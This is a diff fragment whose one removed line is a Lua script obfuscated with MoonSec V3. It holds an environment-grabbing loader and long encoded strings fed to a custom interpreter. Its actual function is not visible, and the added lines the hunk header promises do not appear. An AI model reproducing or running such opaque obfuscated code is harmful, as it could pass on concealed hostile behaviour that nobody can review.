@@ -1,1 +1,3679 @@
-([[This file was protected with MoonSec V3]]):gsub('.+', (function(a) _wtBnMSyYyHJk = a; end)); return(function(f,...)local l;local e;local u;local n;local a;local d;local t=24915;local r=0;local c={};while r<609 do r=r+1;while r<0x218 and t%0x2cc0<0x1660 do r=r+1 t=(t-104)%23868 local h=r+t if(t%0x31b4)>0x18da then t=(t*0xf6)%0x6f71 while r<0x21e and t%0x277e<0x13bf do r=r+1 t=(t*862)%27682 local n=r+t if(t%0x1876)>0xc3b then t=(t+0x69)%0x8836 local t=46574 if not c[t]then c[t]=0x1 end elseif t%2~=0 then t=(t+0x3c3)%0x96cd local t=89284 if not c[t]then c[t]=0x1 end else t=(t-0x155)%0xa62a r=r+1 local t=62992 if not c[t]then c[t]=0x1 e=(not e)and _ENV or e;end end end elseif t%2~=0 then t=(t+0x136)%0x5a69 while r<0x275 and t%0x2706<0x1383 do r=r+1 t=(t+183)%25528 local n=r+t if(t%0x1310)<0x988 then t=(t*0x265)%0x32ac local t=11888 if not c[t]then c[t]=0x1 u={};end elseif t%2~=0 then t=(t*0x3c8)%0x803b local t=48650 if not c[t]then c[t]=0x1 e=getfenv and getfenv();end else t=(t-0x2c8)%0x16bb r=r+1 local t=86747 if not c[t]then c[t]=0x1 d=string;end end end else t=(t+0x81)%0x331 r=r+1 while r<0x1bd and t%0x3d40<0x1ea0 do r=r+1 t=(t+492)%5481 local h=r+t if(t%0x1e32)>0xf19 then t=(t+0x34d)%0x489c local t=40745 if not c[t]then c[t]=0x1 n=function(c)local t=0x01 local function r(r)t=t+r return c:sub(t-r,t-0x01)end while true do local c=r(0x01)if(c=="\5")then break end local t=d.byte(r(0x01))local t=r(t)if c=="\2"then t=u.YUdZBVjg(t)elseif c=="\3"then t=t~="\0"elseif c=="\6"then e[t]=function(r,t)return f(8,nil,f,t,r)end elseif c=="\4"then t=e[t]elseif c=="\0"then t=e[t][r(d.byte(r(0x01)))];end local r=r(0x08)u[r]=t end end end elseif t%2~=0 then t=(t*0x100)%0xa0cc local t=30696 if not c[t]then c[t]=0x1 a=tonumber;end else t=(t*0x151)%0x9a49 r=r+1 local t=85495 if not c[t]then c[t]=0x1 l="\4\8\116\111\110\117\109\98\101\114\89\85\100\90\66\86\106\103\0\6\115\116\114\105\110\103\4\99\104\97\114\106\69\77\100\69\95\79\117\0\6\115\116\114\105\110\103\3\115\117\98\65\97\107\102\106\112\113\120\0\6\115\116\114\105\110\103\4\98\121\116\101\83\118\102\101\87\107\108\119\0\5\116\97\98\108\101\6\99\111\110\99\97\116\102\118\104\86\108\97\108\122\0\5\116\97\98\108\101\6\105\110\115\101\114\116\88\77\118\109\114\110\99\119\5";end end end end end t=(t+884)%29839 end n(l);local t={};for r=0x0,0xff do local c=u.jEMdE_Ou(r);t[r]=c;t[c]=r;end local function h(r)return t[r];end local d=(function(l,d)local f,c=0x01,0x10 local r={{},{},{}}local e=-0x01 local t=0x01 local n=l while true do r[0x03][u.Aakfjpqx(d,t,(function()t=f+t return t-0x01 end)())]=(function()e=e+0x01 return e end)()if e==(0x0f)then e=""c=0x000 break end end local e=#d while t<e+0x01 do r[0x02][c]=u.Aakfjpqx(d,t,(function()t=f+t return t-0x01 end)())c=c+0x01 if c%0x02==0x00 then c=0x00 u.XMvmrncw(r[0x01],(h((((r[0x03][r[0x02][0x00]]or 0x00)*0x10)+(r[0x03][r[0x02][0x01]]or 0x00)+n)%0x100)));n=l+n;end end return u.fvhVlalz(r[0x01])end);n(d(166,"2:Slc*K(wVY#be,R*R"));n(d(16,"-jKmH,81ixYX.kyaaOy8HmmHKKOxayy11H.H.,YkY2i,8n88HHHXjKB.KKYHx,a!km.jX.Y.iY8k118imY,8m1KkXjY,=+aKkx.y.Hx818iki,1i8SKXjK.9X8jmJHaKkx.yX1H,xkijiH8m,iK,jijYaYj1yZ.Yyx8;,HYkxjxH1iP,,.HHm,miKTaiaay,XX.aXKYHYKKHj.1m,,,HmkK,KHpj=HyjkK..X,YYixxmij8m8HmUHY.HX1a8a,ymyH.a.K1mYHx818HamjmmmiKXXHYHO1yjkxkHXiXKYxx1iY8a,KK,kK.jyxj,kYyH.HkYY1xiiHKHji1H,a,mHHmKjxJya1..X8..X1YHxKi.,Kc a,,HmjKKj.{,x8a,kyk&XjYmxXiK,,,Y8i,8jHZYa,YHx8a,kykAXjYmxXiH8m,1,xHaHHJajKYHx,a=yK.xXyXHYHxx118m,xHam,m,XHY8Pmy,k..,XmXHxx1m,j1,mXK8myjxXNYHakyjyH.i,,Y8x.ia1a1K,y,jmmm,*aJHka.K1,"));local t=(-17562+(function()local e,r=0,1;(function(t,r)t(t(t,r and r),t(t,t))end)(function(c,t)if e>138 then return t end e=e+1 r=(r*899)%37659 if(r%982)>491 then return c else return t(t(c,t)and t(t,t),c(c,c))end return t(c(t,c),t(t,t and c))end,function(c,t)if e>400 then return t end e=e+1 r=(r-486)%45347 if(r%1508)>754 then r=(r-351)%27617 return c else return c(t(c,c)and c(t,t),c(t and t,t))end return t(t(t,c),t(t and c,t and t)and t(t and c,t))end)return r;end)())local s=u.dSWiotOb or u.bEZxvDJE;local fv=(getfenv)or(function()return _ENV end);local n=3;local e=2;local z=1;local l=4;local function dv(k,...)local o=d(t,"q( 8vcS-Ut>D1I4rN8tIS>8U*SIr> -#84cr8D(4ID>8crvc(DI4>rU>4SD4U c/(48S Ir-1vSUc- 8rI1GUrrU1ttvS 8/v1rDIDSU8tfvI >%D >c-IIUDi-vv (C S(D4>SUStvt vrSD8U44>1 UScv  cS85rD1---c1 >dc1c> r1I(tUSS8vvI8c(->r>tS18D>v-UvOT4I1r(4-DtUtvI(c-4cr(>4UDS1IDtU4cI 44r>1U4ct rrcD(t(S481rrI tt-814D(S>8U{S(c(-4v>I 1 e,t4UD(8 8D141>>r-tcU(trc1v84vtD>t8cS vr :1rIDrUDSv(S_,18>tS884t>Sr8SFvI 4vI8> SDvI( 4Uv (SI4>1->tvUcvc(S4cD (1r DUUScvS8cv  Ic1UtUSD8Ut SU 4r11>4I>rU--Sv nII-tr=U4 >v- veS v4?D4SDtUvv8  48D>-IS(DSUtc  e44P%4r1vt>cc1 t-c4 1r>(-0SIUtDSr81arS>v>NSIv> D1>ISI844t4DDUU(v1(III>4cDcc  4UDtUc41D4UUcS vvv (r11- >C(1StvS U8S(84rr1I>vvDv-ztS4vv}>IU>S1vD(U8v- E48D-Uv4vD1U7v4(1 D Ir>18v 8(8irc1IUIrSI8t S_ 4848t;>1>tt-v 8!-4StrcU8r(1I->1h441>>-UvS-IvS(c411YU8v4 r4t1>Ucc(8(r41-tUrv1>t_c4 1vj8(_v1I>cSU88pAS>8rPSIv> D4D8-t8r(>Ir>-(c4z>4-1v>(U S 41 cL 841D>UU>DSUcD I1ec18RrU1StvDAtr-i8trDIv8S((I >AS4UU-88ra44US c(v (t48D>--c3D ttv4(14>%crc18t9v8 84rDt-DS>8SrD14tcSr( T(1>tUS-84Ir4a>4->It>v- vO%4I1>>-UUS(v4-D=-4v1cDc>(Ir81. m.vD1U>cU->ct 4rc14tDS181DSIU>( F(U2DIv>- S D((4 >>-)I>>r-Svv(  I(I4>>DU>vt(1U cv(441D>41D-tUc-1.t c1 >rU(tr1I(>jr4Ivt>SU8ScU88: 1c>cS4v1e4-vvt(_I4>1DID>Urcv S4tD((14rDUUScvt S  -r>14 UeS1vt SV-S-(8-rtIv>8SD8vrAID>t-1 SQc4vDvK44t>>-UvSU-v>(r44D1U8cS(ID(DcU(SP80U>c4 Srv1 I81It>ST8(rISv8UYp14t1II>hSr8t54Ivv(i1I>>U-Svv( Id4I-rv>(U4SDvU ceU- 1D>tccS vr 5Ir-1rUIcI8 nX18t4S88DKrID8SE4I >^S4-I-rv1(ctvt Ucv1Br4 vU(D4vD U_t-UtvD(r4Dcv8>rfD4U1>IUDSU Iz Ivv4Sj8trIItcv-28r( U1>I-IvS(v4(D U r1>>-rvS(v4 Y84I1(UUv1rr4Uc  S44D1U>>UU-SS -r4I  1r41UtSSvUOS(8DH(S>81*SIv> 18>-US8r>UU1vv( 4T OI41 -tct -4-1vU-cErvD-Uccc crO1ctvcr8CrS1tS 8vr411t>1 tD-S8->W-v81m>IU414JD-UUc8(r->vI(S4vD 18DIUUct >USS,  rsD41r11UIc-8Ur-D-t-S> 42-II8v(8Ist4S1-D-Iv>(8t USSrv4(-tUU>UtcC(-48DDUU4U1SUvc  M8D Drr1DUD8S8-zvI tDSUrtI>I8>tS414>(S>8U+S UdD4v>>-(IIv {rII>D-tv-ScUt(U4UDvU c%-I88DIUUcS vr 1GU4DcS>rU14tvS 8Ac(8(RSI(>IScvvNcS4v-,>IU>SDcDSUv8rEr4cSUS8c8(S4cv4 84>DUUSt1tSSv 4I8Drt1rS1tt S% 4S1 IrtI >a6 I1t4S18>cr8-dI4SUS-Iv44I4Y>rULvSD:UDv1(>4U#t4t1vtSc8 4>>> tcSv4 It>  1(s1UtSSvUSSc8>+(I>>--UvU1 4v>I 1 I(-4 D88 8-(I44DS-14SD1U cJ(4 I rr11cS>c88 rDc1v-rU1Stv>Ut1-88(?UI1UtS-vv&tI4DYc vIZU>8DcU:v87r48>4-rv-Ir4->rUtvrDUU1cv  rGe rcDDU>S 88tcr>1-tcS88(rr?Iv(In>vS18>kU(D((ID>4-8vU>>UvvS(v4 r14I>r-DcvISIvD4U(S- (r1cU8(rv1 tG>-ttcD rrD>S>--vv ;DIU8UR>Iv> -_UvSIvI(1-SvI( 4G>41rDU-tc((t> tI-rc>D>U4cS vr M>rI11v>v(;>tvSt8fr4112-1t>S8(v &tI181(4IU>S-vtS-cv>((4>D-UUcUI rvDI818tYU>S>Dt(S  >r5c>8(rS1vt >1>8cI4>4114ttSr8ct4-c8>_UISr-4D>4Srv1(IIISSS44 D>-4v1(> r(DrU>cUcS98 r8DDUDrv1ttac4 18I8-gvI t-S8v t1-Y8U%SIv48Iv> S58Dn>-SvU( 4z>41>DtUSvDDvUSc<(441%Sr-DIt8r 1cU4c1 >SU -rIIv>8r4vct>SU8SS1vS(vI4>rvv5-IcIU>DU8v((D41>1vvv- (4I-I-Ic> (Dc1DU-c  SrD1tt8Str818t8S 8vr>1UtrSc8cOvIc>vSI81E1I->S-8v iDr14tt--I - -4-U4Sr Arr1>DIt-SKrI1*>tUrc4HIIS>--Dv8(k5(D>Scct((4->(-t-(vI4cD1DSU(((4r>UUcUv8v4v44>tcDc4 -rv1US>v  IrStt--SU8v1v>(crv-rDHUS 8vr411t>1!tD- v(>7U)81^>IUr8IcDv-Dv8 <4>Dv--v-(-I8D8U4Sf (4tDt  rtD4U1c>-1c4 Irc1Dt1S(8I<DSSvc3 I^t4>I>r-1vc1vD1>r--v>1>D1DDU vt(c4ID>(>41DSUvc --c- >44cU8(rv1 t!>ct(S4gDr41It4Svv!A(IU8UKrIv> -VUvc1 I1UDUD8U(cv (-1v4(U4SDv4>Drt8c4D>tDcS vr /(98Iatt(U(Urt11trS-8>D>>1>D- 8tNcII>>;IIU>S-vv (}c4C-D>vU(I4vD Ul>cU(vD Urc1 tcr(D4U1SS UrS1v4SI-t8S(8U4D1D>S-U8tQ(I(8IjUIS>v- vuU4  4>-Uv1(v4 DK1(DDUSc- UD-c  >44D1U>>DUDSUm4rt1!t4cD8>yrSv8cjh14t1D8>8S-Iv>>-084d1vIzI4>DU-Dv4(c4rv>  4SDvU t(U chWI4IDttUcD rr1c18(rU1StvD t1crvcrrI>>t_vIU>=S481vDvS^>ItDvU8I4>r->vU(S r(-rtc((14>DUUScv   tr4U1cI UrS1vD8U>> r1I tUSS8vvc8(R>IUt1St8tdr- vSi4I1>>DDU1USv8(I48v1 (4UDSUv>cUtc3 Ur81SUIrvISt%c4 18D8I!>I8c vv88/rI4>>-cvI1 DvD8->v(ZI4cD ( 4v>4-1v>S8vr(-4Ic< 141D>UUDMSIS+ vr8IvS1cI 4rcIUttSI84t>-88SjvI 4-I8DLvIvv5rItDBUv -(w->Sr(S4vD IvDSUccIIU41DIU4ccI4_8DDtD(S8vEv1r> S( IK11DtU  v-%-4?>  U 8(84(>4S(v(JItUt1v-4 D--4v1(>v4 Ur8Dr- 8cr4U>Sd Srv1 IvI8t>S( IZcI >cL0Itt1S>8Uc88I(!It>D-ccvaI1(>tUD4lDS-1v>(U r  rc1v-rc>(I4IcS 4r 1WU4DQ->v> DnUI-> S18(Y1SUv(#vI >J1(>(-1v4FD4SU1-rv4rcD4vU S4vD UY>rt(c4 -It1UU8S 8 Io1rtScI tZ(14 4rr1>tUSS> S-v-t4- 8>YUISzI4{D8-8v4(4-UvI(v4 DRI(13-rcU S4tDS b;-D1U>cUS-St8Srr-4-SSt8(_vUvt4S48v.(I1>SS-vZ1 D8tr-rv4(vIDvv(t4k>4-1t>Uvv-(-4-ttU 41D>UUcS vr 11U4c1 >8D8cnSI:tc-p(4rD11tr-tvc>6-c813>IU{t48D0-4v8Jr44vD(S4vD UPv4r1ctrUUSS8  r+D4IrDDt4cD 8I811t>cD(-rII8tSS-v t4-c8>;UIS4cI4>1cDv((-I>>DUS4 D--4v1(> D crSD-S-S8 cU>S( Srv1 4818t4S8 tP 1I>S-t14>vS>8UWS -(-I t -cv4(vIDvv(14L>4-1tvUDcc  1-D4U(cD(44IcSvvr 1sU41vt4S18S14t(cr-cv8((tS>U-88vQ1IIDv8U8D(c4(-(-(c((rIrD1vc 8(D4vUD(14rDUUScvtcS^(rF81U Ur11vt SP>(-88t9>1>>-X 48t4S18>c>8U(1D8>4SrvU 841>r--ccN848D4t/c((t4tc  I44D1U>DDtUct 85v18-TSr8SrI1t>(S414>US>8U/S SwDI->SUh(I(-4vDUUvvr(>-1c8(U4SDv18DvU  4 rr11>t8Sg1Lt>c1 >rUd1rcIvtI(4(>rr1t>UStvc(vS4v %>IU>S4D>4Srvt((r8vU 84vD UM>It8c4r>rv>(-cSt(-:c> - S(1v>3SW 4r1(IrII ttScvvD418trStvS(84pD8W44->>-UvS->vD(44cD(U1cU U4I1}tv441vU>cU S8c8CFv-4--S88SrISvvS#V14t1D4tI- 8t( IrD)UOr>(14cSvcv 814I8DtU>c (UU c1(441D>rD1>UcSv8vI I(tUcr D/8IO8#?v11t>SUU8-I .k(ID>(y>I1>S-vv Sc  (c4-vU(I4vD UR>(UDc1 1rDDUt(rK1vU1c> Uvt tFvISt8S41>t1SS8vB (D(iI>>SyUI4>v- vFSkvD(r4S>>-Ic&(--4c>(>4UDS1c1-tvcII1I!DttUS(4 4 Drt>Sc1UtISv8 d; (ODIt>SS>v8((-lv1&1I>>U1DDv-Sv(  4(>tSDvD UrSDtU1c8D>U1cS vr Rv4r1(tcrD1S--8vr(tv1cS1>>8SYII >*S4UrSrv14148>4-vv8(4->v1(S4vD I->rUcc4DUUDcv  rkx>M(11>(SD1vt1S_ 4r1 PrIIU>(SD81M>Ic>t-SIS>t- v3:48H( IID8-t4  t-4v1(>cX >rU1 t8 U4DDtD1UrS- crrIzto U DLcI(S(S(84sctt>rSD8Ss>Ir>I--vII->---vS(U4SD8U8vD(I4ID8UUcv (r DIUIcc  4rIS>USiSS8z1tD-U(-ovv4I1r->ctv1(8Ict8c  rm448UtScvbgSDI>1-U(t5(4>UcU/8-( r11SU>8trS4v1rS>vD(I1-t8cDvc8-4>14SIv4 8(-IU>Dc>8c(4D8--cr8Sr4>4vS(r4 DV-4t8-rc1(cI-D-tvS  crUDr Srt1 t)c4SrSt 1rDI18 )U14t1S>U1SDvXB-4x>I-4v4>UU vv( 4f4rr(D4U-2SrU4-18t c4 t3(cS tr 1EU4>r>(S( 1=US v r411t>>t>D-Uv(1?>r>4-8vD*DtvUSUcv1(8IrD-Uv4- Itvr1S81D8 W>t8  rID4U1c>->Sc8Ir811v4v4 rr1US-c-Fvvt4--8>2UISrU4t>c-8v>1>1DDS-tv-(v-4SS(>4UDSIUD-U1c8 1rt1>t>(v8Srr-4SrS  trrI >cS(vcD11(>--Uv*XS-pvSG1I>>U18>I-cvU(-4UDS-I4SDDU c,(4v( Ur81vt8St 4t(c1 >rU1StvS S48411> SU8S}v(8(vI>tI-Uv1Zr4-v (>I4>1->DvUcvc(Sr81 U4c8 S4Icv 1rjD4U1t1tvc- -rIU:-(S48tNrSS8Iz I*t4>It4S1 >(8It>-->v(>>-IvS(v4 rIr8DUU4c(DSU4c  X4464rr1S-tct8veS1-Urcr1DtS>(18SZD rvvD-DoS41> -L84S38r(vIDDvU(c   t1D4U-2SV 481 t8S6 t>U>It8Sv 1r c181rU1Stv>ctUS8 rbc1-UtScvUZc1IUrSrv1(>IIDf--I4Dv->vU(S D(84ID8U1vD Drtcv UrAD4U1Ddt-S 8trr1c 4!c1>tUSS-cSS8vr(IU>8S18D(S- vUV4I1>>14>DUGc((84-1Wt84UDIUvc  ?8? Urt1DttS8 rtuSt 1r>1UI>1I>c-P8>rI48USS-v(_--6c4T1I>>U1DD -4vr((4-S>crv- (4-1_-rcr I>UD(vv888c+ 1Dv>8D8 rI1ctDS884D>1c8-kcI >tS481F> DV4IcDv-Dr4rtIDDS(S4rD U;v4crc  -rc1-U-(2(QrD1ttcrS1Ut Sm 4-: DsDI(8vk-IHt4S1UI--vD( ISvb SI1>>-Ut>-tv4(c44DDU1c1ISrU1(vn8G U4rDtUtc14 4-1It4SS 1tS-S8 b&14I4Ir>(- 8U4cIr>1- v8fr1t>t-ccv(-4DDU(UrSDvU cHS(cv(r4D1(--c88Sr8>rUrS18>rIIst-x(11t>SU8SFv8  8>481(_IU>S-vtc-rv>GI41>t(S4>D Umv4-Dvtgc4-DItFryO-U1c> Uc48UHSIQ>(8Srt1-IUtc-tr4JcIc>4-MvDVS4-D8-8v4gI4-DvUUv-(4r ->-Ic- 8D81Stcc1rc1 Utc- 8%Ur1I8t(SU811cISt-SSv(1DI tIS-8U(ctr>DSIv8(S>cD(-8vt(1>>DSUIv-DvUIc7(441r44I1tU-Sv tr4IQt8S-8vtv-n8Ar4114*I(>vSU(Ukt4s>r-4(DE4II>4-vI4Dc->vU(S -(>4(1E-IvI 14D1S  2(D4U1c>StSD8U6(Ub-vcI81icUSU S-8((%I(>I-1IS>>- vNE4 vPrItD1-tciDPUUv1(>4Urrr(D8U-c8oU4DD>UDSx1ct2c4 1r>1UtS>I- g_Itt1S>8UvUvt(DtWtc-(8D(U4cD Uc4gDr-1v>(U8U(tr D1U-vr(Dr1DDUUvc8vrI14UDcr Dt-S 8{r411t>SUc>vvI >DS481W>  (cIID{8V8(((41D4-DcSD Utv4(14>(-4c>DU-c( 4rD1UtDrS1-t S= 48I (4USS81N Iet4Drtr-1v>+I4f>-U(I1DI-UvS(v8U(trQ1{Urvt  1I1,tWS88yI-Dttvcc trcIf 1E81UtSSvt(cr( ((IUtrSDv8(y-nv1l1I>>UDI>tUS8j :4D>4UIvt U1DD4UvcDD>t(cS vr (8N 1Dt>v18Irt1-t4r4IIt>SU8S t D1It8>t8-rI_>tvS-cU(UI(1-U 8D8-D Urv4(14>r4r 1tU-c48 IrDIt>cr8v,S>U>8c41>>5SS8vJ  rrI>I>I-D8D(U4cvi(tI1>>-UU1-ccv(It4U4UtcD t4t1c 7r(D1U>cUS4S88 tR-1 1r>1U4DI t4Sr8(6-U>-rS-v(y-4Ctr-rvI1UI(Svc8cc  4DS>ctcU(IrcDc84vtD>UDcS vr oIr-1> >As1StvS -(-} rrrII>t v >>K--81^>IUrI48Dv-Dc((1ID>D-D4v1rUiv4(1 D >4r1-U-(bj(r41ttDSt88nU1c>P(1r-DU>>>I-d8(KDIctI U(4(tIvvK( I1>>-UtI-ccU(c-4c((>4UDS1IDSU1c8 ?U>cr Srv1 ISI-UISc8Ibr1c8 }S14t1S>-r-cv#(DI4>8}14(>U-SvvSvvc( t1UDUSc>DvUrc}(441L14I1pt8cD 4>4>rUrS>81rtIv8dlU11t>SU---tvSJrU4UUSr8t(1Itv  tI4>1->UtUDcU (>.tv-Ic1 c>S1ZtscS 8r41UUtS 4vIc1(>(-K8SrISSv(3 Izt4>r> SI8tlrI(t8-8cg(44(Dv-D4 1h-4v1(>8D(DrUtDU-c1 Dr1DISrS  SrcISt(SI1Ut1Sv8 %/ )m(Iv>-Srv > --84{1I>brIDDU-tvc(1r v>(14SDvU ttU(cD UUUc> vr 1lrcDIt-cI1StUS 8)r4v8rDI(>>;v48>FS481c8vcp-ID>-SvcGWI4UDDUSvc v4cD1-rS8DUU4cv  rP/ rc1It1c-8 rc1c 4c(1>tUSSt1-Svv%4Ir-v8-pc(SI8D-81v8(841>4Utvv cr(D(U1vD cr 1SUcc18KDUDDtcS(r(ovI8t>88hy1-tcS(vS8>((1r>S->:8(vIc>v-rst(9ID>c-Sc8II4t>DU(cv481DD4t c( 144D-U-c-zI4r1>UDcr DGStut1-8 It>S>8S_vI rvD48rSSS-SUStS>S1DI4D->c((S4vD 1UD-U)vrIUIvDcUrccD4t-c> UrS(vr41(t(S(8 l-I tUS-v t4-c8>5UIS4c4-Dv-Ir1rdItDUU(4 Dv-4v1(> I vrtDr 2r(D1U>cU-8cc8>tf-8 1r>1UIUIttDS18 4cIU>1SDvS!UI(>(-( I{IItDU-Dvr(1-1c8(U4SDvI(D4S(cv(DrSDIUtcS1KtIc1 >rU8 P 1Utc-28>rDIvcSv-88(84 >USrIUDS-vv (K BBIIID8-IcS (rcD1Up I -r 18tv 81(U1c> UrS1vt SN 4rr1>tUSS8v2 I:>S 18>(LIS>v- UtU( U(tIt>>-tvSDwUtv1(>4Urtr81 ttY4!Srt1UvS8I=St%S- 1r>1UIDI1t-S8v8(3It>> SIv>r-284e1 I&I4 >t-ccv14D4DtUDct(trccP t41D>UUt4tUSS8?4(1(t1S4 rr-1-85a111t>SU-4-8v 1l1(>(-1v4xD4SS c1vI 8->vI(S4vD rv>r-4cS(IUSc>  r0D4IU1ttScI%IJ}SJ8cr11>tU>>tt-cvv(yIDD8!UIU>v- v{-Ivr>>-IvS(v4 r-48D>Uvc(DSUIc  h44BLr1DtUIcD 8r 1>t(r>ICtSSv8 v18-H8I >1Srv Tt-%vvZ1I>>U11>c-4cc(84rv>(14SDvU >vU-ct(rUUcI vr 17Ic1DtUSD 4rt1-8b5t11t>SU--SU8S4v43>D->81(c4DDn(8I4>1->vU(S vv(17v4 U4>DUUSt>U8S  D>1>-t-Sv8-xS1c>hr14gtUSS8vvv8(;(I->(->vc(t4i>vS v4.D4SDtUvv8  48D>-IS(DSt c  m44&r4r1vUDc-8SDR>DtDSU8DN>1t>vaz(4t1S>8US4vU(S4VD(vSmtI-4U>cUty4(c4cD4UycD(Sr-18U8c4(Ir-1vtUc- 4W U>UIS-8818IS>cS1mcI ttS-88(Ub148>(-Uv1Ic4S>--Sc(ID4 >I--vU c>rDD-Ic8 SDc>-U8SS 8ItDDtSc- Dr-I c1SU8rrtSS8IG IOt4DUtD->8IicI4>-Srv>>>U(vS(v4 r(411f8>8t D4tD-U444ImU>cU S8c8-Tv1Iv1vI ICv1Uc c088(}U>-t->vUC8I8>tN14v>U-Svvcvct14rv-1Svvr >4-1U(4r1D>UUcSScS-8vrI-1-gct8Uo(U - SI8r,I1I>t#v4R>dS481vDvI(>48S c>vI(c4USUSUvc X4Dv4 v4>DUUS>tSD88 Ir41UUISUc>tUSH 4r1(ttUSS8v,8I&t4S1v1>-IS>v- SPE4I1>>U>18(v4 Dk(1v1(>4UI1 /c  a441 U>ct S- 1 tv>1 Ir>1Ut1Sv88k%I 4>SD8UmSID> -(84Y1v >U-Svv(84.>4-1c1tc4SDvU St(441D>UU(r vr 1<Urc1 1rU41tcS 8Vr4r1t>St8Sr4I >vD18IB>IUIS-vv8(&Fv>I->vU(S(vD U(v4pS4>D1Ivcc  r:44U1cD U(11ct S_ 4 11>ttSSUDL Iv41SI8>LU.S>v-8vP8v-U>>-UvS S4 D(-4I4(>41uvUcc  ^WuD1UDcU >v 18tnc4c1r>1ttSU>88!.14t1t>8U)-Iv1v-Pv c>ID>U-S-v( 4(>4> vD(U4SDvD c_(r41-1UUc>- r81WU4U1 >rt1SD>S88Jr4111>SU8-6v8(>5- U><DIU>S>vv ((I4I -DvU(S4v4 URvr(11cDUU>>  8r7D4D1c> trS4>t8Sj 4r1r>tUS-8vI_IA> D>8DQUISIv- v(M4! >D-UvS(v( DA-rv1cI4UD>I c8 O4441U>ct S(>c4tic4 1(D1Ut-Sv4DzhI 4>SD8UaSrc> -(84(^ U>t-Svvv 43>r-1-R(t4SDvU U_(44ID>1 cS Uv;1(U4c1c>rU1-tvUU8(r411t>tU8SfcI D(S4vRcUIt>S-v- (QIr>1>o4v(S4vD >Uv4(I4>>rUScU-=r(D4U1U  Ur-1vtS>4 rr11>1USS8c3 rS8>S18>RUX(>v-8vR1vI1>41Sv-(v4 ID-4vI(>417vUcc  h(4D1UDcUv1rc1 tec4c1r>1ttSU18 ?v(1tIS>8U8SIv>8-KSvhII>>U-S-v( 4(>4 vv>(18vDcU cKv441DDUUc>- r81%U4DS8frt1S>SIr8Crr1118SU8Szv4vS>S4849>r8>--vv   cD>1-IvU r4vD URv44c4>DDUScc  r D4U121 UrU1vtvS/8(r11>>vSS8cV I t4SI8>(>>l>v-8vWS1I1>>-UcUSN48D -4Sc(>4UDSUvSt Lr?D1UDcU UrvIv>8c4 rr>1rt-Sv8  /48t1SI8U,tIv 1-Nc6 SI>>1-SvD(84^>4t1c-(U4>DvUScY-S4111UrcS >r  5U4c1 >rUDrtvSS8{mv11t1SUcS( I >vS4v/i>1S>S-vt (+4v>1-IvU(S4vD Urv4 g4>D4UScS  B 11U1cr U(U1ct Sxv4bE1>tISS8t% rct4-4c0%UI1>vS v,!4I1>>UUvS(t4 D -4v4(>r>1DUvcU &rcDIU>cUvSLv1 tSc48 r>8>tSUvv4{)Ivt1-E8U((Iv1 -r84(8I>>4-S->( GPr8-1c (U41Dvc cX848(D>t(cS >r >ZU4S ((rU1rtvD(8!rr11tDSU8>c I8>eS4UDM>It>S-Uth((I4>114vU(-4vI 1cv4 c4>D4US8v  (dW8U1S8 Urr1vD1SVv4v(1>>(SS8I^ 4St4-  (+UIr>v1-vY}rI1>D-Uv>S 48D}-4>((>4tDStS(1 )r-D1v>cU SrvIviIc48Sr>1rt-Sv8  a 4tI-v8U(pIvr>-xcT(rI>Dv-SI1( 4d>4-1c8(Ur+DvU4cZ N41I>> cS 4r 1>U4It >rUIStvS18_^711t1SUvU(UI >DS4U u>IU>S->SD((4>>14-vU(-4vD>Uiv4v-4DDUUScS  riD4U1Uc trS1vtSS< 4r11>18S-8v5 Ict4S18>TUm(>c- v!(cI1>>-UvS8r48Dp-4cv(>4UDSUv-I (44D1t8cU Srv1 DDcr 1r>I tSSv8 WVrttIS>8UJ-Iv> -E84(UI>D8-SvS( 4(>4U4(v(Ur(Dv8Sc6(441111Sc-8<r 1-Urc1 >(UI^tvS483j>11r SUvUs>I >4S4ct7DIU>S-vcD(_4>>1UUvU(U4v1vUIv4 t4>DrU-cv  (:IUU1S- Ub81v4>SGvC9-1>>-SStvw Ikt4S1c8=U48>vU(v0(5I1>>1-vS  4 Dm-4v1(>r>88UvS( <18D1U>cUvS8t1 trc48Dr>c4tSS>cDi(I4t1Dv8Uy-Iv>S-g848-ID>U-Sc ( 4O>4-1-c(t4SDvUrc/(441D>D8c- vr 1DU4c1 >rUr(tcS 8?0>11t>SU8Sc4I8>rS484P>It>SUSv4(y4I>1U(vt(S4vI tXv4 D4>1-USSI 8r! (UISt UrU1vtvSV8vIc1>>-SSD X I(t4S18>{1 v>c- vQU1I1>D-Uv>S 48Dx-4Iv(>4tDStS1r 2rID1t(ct Srv4 Icc48Dr>I-tS-(8  GI4t1-t8U(cIvc -T84SSIDD--SvS( 4(>4U4cD(UrcDvUtc((441I>tUcS88r 1rU4-c DrU ttc-(8WNk11t1SU814DI >rS41vo>It>S-cv (v 1>I->vUt44vD8U&c S>4DDUUSI   r(D4t4I- UFc1vt-S( 4r11>t4SSv8d I(t4S48>.UIU>vU vbi4I1>D-U-S  4 1}-4vI(>D>DStvc4 prID1DScU8SrvIv>cc48Dr>bttSSv8 8g4St1-t8UIZIv-D-gc<B4I>D--Svt(84g>4-1c>(UrcDvU8cl P41D11dcS8vr r1U4c1 >HU8Utv-(8_t 11>>SUvUU(I >rS4v(zDIU>S-vZD({4I>1-DvU(U4vDvDUv4 14>8cUScv  2o8MU1St UrU1v> S*v)-t1>>-SS8tW8IFt4S1:8jU4c>v-8v.(.I1>1DRvS v4 1S-4v1(>rU UUvS( {rKDIt>cU8U-(1 trc48(rD1UtSSvrD+CIIt1SD8UxUIv>v>U84(1I>jI-Svv( rR n-1ct(UtDDvt cm80StD>t-cS tr81CU4c1r8rUIctvS88YV!11t1>n8S(vI >(S481,>4U(U-vc((eU>>1U>vU US(D Urv4(44DDUUSSStrre14U1tD UrS1vD >c 4P11>>USSr4) IprUSIvtBUIU>v-8vg +I4>>U-vS1t4 DC-4c4t-4U1SUvt8 d44D1>>tI S6v1 >^c4rSr>1Ur+Scv(dnIat1SD8U(U4U> -r84((ID>U-SvvID4:DI-1vD(U4UDv> tc(4rDD>t-cScjr 4bI8c18trUIctvS88V_vD8t>--8SDSI >(S48IX>I1rv-cv (ktY>1-DvU(>8 D8U}v4IS4>DtUSSStrrj1IU1cr trS1vt vc 4LD1>ttSS8S0 4 >tS1v>LUII>c- vk 4I4>>UUvS v4   -4S1(I4U1SUvS  lrtD1>>SI S9v1 >5c4S r>IUt-Svv(Z_- t1->8Ue>4 > -R84ISI>>t-ScSUr4eDI-1vr(t4SDvU (t(4rDD>UtcS Sr 4gI8c18trUIctvU48k(4((t>--8S(8I  rS4v r(IUDc-vf8(;Ir>1-DvU(>8 D8U;v4II4>DtUScU-6r(D4U1(r Ur-1v>vII 4oD1>tIS-8vB 